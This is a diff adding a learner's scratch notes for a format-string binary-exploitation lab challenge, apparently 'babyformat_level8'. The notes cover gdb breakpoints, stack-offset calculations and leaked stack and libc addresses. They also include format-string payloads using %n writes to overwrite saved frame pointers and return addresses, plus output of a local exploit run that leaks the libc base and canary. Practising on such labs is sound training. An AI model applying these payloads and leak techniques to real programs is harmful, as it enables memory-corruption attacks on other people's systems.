@@ -1,0 +1,154 @@
+
+
+len("Your input is:                                                                                                                             \n") = 140
+
+b *main+341
+b *func+13
+b *func2+521
+b *func
+b *func2
+
+b *func2+516
+b *func2+527
+
+516
+526 - nop
+527
+
+140/8 = 17
+140%8 = 4
+
+0x7ffc382ebdc0 - 0x7ffc382eb810 = 1456 = rbp func2 - rsp func2 = 182.0 + 6 = 188 = rbp address
+0x7ffe881cb1a0 - 0x7ffe881cb010 = 400/8 = 50 = rdi - rsp
+50 + 6 + 17 (140/8) = 73 + 1 (for 4 characters) = 74$
+
+b'02: AAAA 0 (nil)'
+b'03: AAAA 7f769d987077 0x7f769d987077'     // 7f769d987077 can be calculated using libc base, its location is %3$lx, it can be used as offset
+b'04: AAAA 14 0x14'
+b'05: AAAA 2d 0x2d'
+b'06: AAAA 26ec195580 0x26ec195580'
+b'07: AAAA 7ffc0b15bf16 0x7ffc0b15bf16'
+b'08: AAAA 7f66f1ab4e74 0x7f66f1ab4e74'
+b'09: AAAA d82b830 0xd82b830'
+
+
+0x7fff4db35cd0: 0x4db35ce0 => func2 rbp -> func rbp
+0x7fff4db35cd0:      loopne 0x7fff4db35d2e
+
+
+12b0 <func>:
+12bd
+12c4 : ret
+12c5 <func2>:
+14f1
+14f2 <main>:
+1652
+=====
+
+main
+0x7ffe19504740 - rbp, 
+0x7ffe19504700 - rsp
+func
+0x7ffe195046f0 - rbp
+0x7ffe195046f0 - rsp
+func2 
+0x7ffe195046e0 - rbp
+0x7ffe19504130 - rsp
+0x00007ff039bdb000  // libc base
+0x7ffe19504748 - rip main, 0x7ffe195046f8 - rip func, 0x7ffe195046e8 - rip func2
+rbp main - func rbp = 80 , rbp func - rbp func2 = 16
+
+%188$p %189$p %190$p %191$p %192$p %193$p %194$p %195$p %196$p %197$p %198$p %199$p %200$p %201$p %202$p     
+
+0x7ffcec0e24c0 —▸ 0x7ffcec0e24d0 —▸ 0x7ffcec0e2520  => rbp func2 -> rbp func -> rbp main
+
+0x7ffe0f2a66e0-0x7ffe0f2a6130=1456/8=182 = rbp - rsp
+
+0x7ffd9ac0af90 —▸ 0x7ffd9ac0afa0 —▸ 0x7ffd9ac0aff0  => rbp func 2 -> rbp func -> rbp main
+func2 address = 0x5649bd3b12c5
+
+0x7ffdc2156540 —▸ 0x7ffdc2156550 —▸ 0x7ffdc21565a0
+ 0x7ffdc2156548 —▸ 0x557b75cf52c2
+
+0x55e68236c2c2 -> 0x55e68236c2c5 
+
+prizonmike = me_shubham
+
+7ffdbc18e518
+
+0x55f5edb35180
+0x000055f5edb35180
+
+0x7ffff9d3bbe0 —▸ 0x55aeeea70180 (_start)
+0x7ffff9d3bc58 —▸ 0x55aeeea70180 (_start)
+func rbp = (start - 8) address // not work
+func rip = start value // works
+func rbp = start address // not work
+func rbp = start value // not work
+func rip = start addr// does not works
+func rip = start addr + 8 // does not works 
+
+0x7ffd03034d50 - 0x7ffd03034d10 = 64
+change main rbp+8 to point 1 address before _start
+
+# %174$llx\n + %175$llx\n + %1$llx\n + a + %174$hhn
+
+0x7fff9c407bb0 —▸ 0x7fff9c407bc0 —▸ 0x7fff9c407c10 ◂— 0x0
+0x7fff9c407bb0 —▸ 0x7fff9c407bc0 —▸ 0x7fff9c407c90 ◂— 0x0
+
+b'%174$llx\n%1$llx\naaaaaaaaaaaaaa%174$hhn'
+
+0x7ffdd353c4e0 —▸ 0x7ffdd353c4f0 —▸ 0x7ffdd353c540  ◂— 0x0
+0x7ffdd353c578
+0x7ffdd353c580
+
+0x7ffdd353c4e0 —▸ 0x7ffdd353c4f0 —▸ 0x7ffdd353c5a8 ◂— 0x1a23c145374a47e1
+
+0x7ffd4c930af0 —▸ 0x7ffd4c930b00 —▸ 0x7ffd4c930b50 ◂— 0x0
+0x7ffd4c930b88 ◂— 0xc8ed0a29540263c3
+0x7ffd4c930b90 —▸ 0x559def9f8180
+
+----------- 
+0x7ffead39d420 —▸ 0x7ffead39d430 —▸ 0x7ffead39d480 ◂— 0x0
+0x7ffead39d4b8  0x7ffead39d4c0
+0x7ffead39d530  0x7ffead39d538
+
+0x7ffead39d420 —▸ 0x7ffead39d430 —▸ 0x7ffead39d4a8 —▸ 0x56291fb1a4f2 (main) ◂— endbr64
+0x7ffead39d4b8 ◂— 0xd1cd936394f053d2      0x7ffead39d4c0
+0x7ffead39d530 0x7ffead39d538
+
+ ----------- 
+ 0x7ffcd859d5c0 —▸ 0x7ffcd859d5d0 —▸ 0x7ffcd859d620 ◂— 0x0
+ 0x7ffcd859d658 ◂— 0x431913226d1cf396
+ 0x7ffcd859d660 —▸ 0x557b02922180 (_start)
+
+0x7ffcd859d6d0 ◂— 0x0
+0x7ffcd859d6d8 —▸ 0x557b02922180
+
+0x7ffcd859d5c0 —▸ 0x7ffcd859d5d0 —▸ 0x7ffcd859d6a8 ◂— 0x1
+
+----
+12+12+2+2+140 = 168 = 0xa8
+184 = 0xb8
+---
+ 0x7ffd585c3260 —▸ 0x7ffd585c3270 —▸ 0x7ffd585c32c0
+ 0x7ffd585c32f8
+ 0x7ffd585c3370
+
+ ========
+ [+] Starting local process '/challenge/babyformat_level8': pid 17511
+leaked libc_base : 0x7fadd1e2b000
+rbp_main : 0x7fff6c215f80
+rbp_func : 0x7fff6c215f30
+rbp_func2 : 0x7fff6c215f20
+rsp_func2 : 0x7fff6c215970
+rip_func2 : 0x7fff6c215f28
+canary : 0x7fff6c215f18
+[*] Process '/challenge/babyformat_level8' stopped with exit code 0 (pid 17511)
+main_rbp : 0x7fff6c215ee0
+func_rbp : 0x7fff6c215e90
+func2_rbp : 0x7fff6c215e80
+func2_rsp : 0x7fff6c2158d0
+func2_rip : 0x7fff6c215e88
+rbp func2 difference : -160
+Success
